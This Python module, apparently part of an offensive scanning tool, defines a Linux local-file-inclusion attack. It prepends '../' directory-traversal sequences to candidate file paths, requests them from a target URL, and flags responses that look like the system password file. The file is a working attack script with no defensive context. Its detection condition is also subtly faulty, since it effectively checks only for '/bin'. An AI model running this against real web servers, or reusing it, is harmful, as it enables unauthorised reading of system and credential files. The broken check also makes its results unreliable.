import requests
from banner.banner import END, GREEN_NORMAL

class LinuxLFI:
    def execute_linux_attack(file_paths, parse):
        for path in file_paths:
            path = path.replace("\n", "")
            print("=" * 60)
            if parse.walkcount:
                count = int(parse.walkcount)
                for i in range(count):
                    if i == 0:
                        path = ".." + path
                    else:
                        path = "../" + path
                print("Payload: {}".format(path))
                query = requests.get(parse.target+path)
                if 'root' and 'bash' and '/bin' in query.text:
                    print("{}Probable LFI: {}{}".format(GREEN_NORMAL,parse.target+path,END))
        print("=" * 60,"\n")